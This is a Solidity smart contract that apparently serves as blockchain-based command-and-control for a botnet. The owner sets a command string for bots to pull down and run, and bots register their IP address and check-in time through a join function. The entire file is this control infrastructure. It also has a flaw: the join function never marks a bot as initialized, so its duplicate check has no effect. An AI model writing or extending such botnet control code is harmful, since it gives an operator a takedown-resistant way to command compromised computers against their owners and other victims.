pragma solidity >=0.4.0 <0.6.0;

/// @title Main contract for controlling bots
/// @author Doshmajhan
contract Controller {
    address owner;
    string public command;
    
    struct Bot {
        uint last_checkin; // last time the bot reported back
        string ip_address;     // IP the bot is reporting back from
        bool initialized;    // if this bot has initialized yet
    }

    mapping(address => Bot) public bots;

    constructor() public {
        owner = msg.sender;
    }

    /// @notice Sets the command for the bots to pull down
    function set_command(string memory new_command) public {
        require(msg.sender == owner, "Must be owner");
        command = new_command;
    }
    

    /// @notice Gets the current command stored for the bots to run
    /// @return The current stored command
    function get_command() public view returns (string memory) {
        return command;
    }


    /// @notice Joins a bot to our network with the given ip address and eth address
    ///     each bot is unique to its eth address it was intialized from
    /// @param ip The ip address of the computer the bot is running on
    /// @return True if the join was successful
    function join(string memory ip) public returns (bool) {
        Bot storage bot = bots[msg.sender];
        require(!bot.initialized, "This address has already been initialized");
        bot.ip_address = ip;
        bot.last_checkin = now;
        return true;
    }

    function fund() public payable { }
}